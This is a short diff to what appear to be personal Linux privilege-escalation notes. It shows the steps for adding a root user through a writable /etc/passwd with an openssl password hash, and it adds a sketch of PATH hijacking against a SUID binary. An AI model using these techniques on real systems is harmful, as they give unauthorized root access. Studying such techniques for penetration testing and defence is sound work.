@@ -319,4 +319,10 @@ choice.
  ### Editing writable /etc/passwd
  - create hash  "openssl passwd -1 -salt [salt] [password]"
  - in /etc/passwd add username:passwordhash:0:0:root:/root:/bin/bash
-
+ 
+ ### Eploiting PATH variable
+- find suid file 
+- create the file in /tmp imitating the the suid file
+- export PATH=/tmp:$PATH -change path variables
+ 
+ 
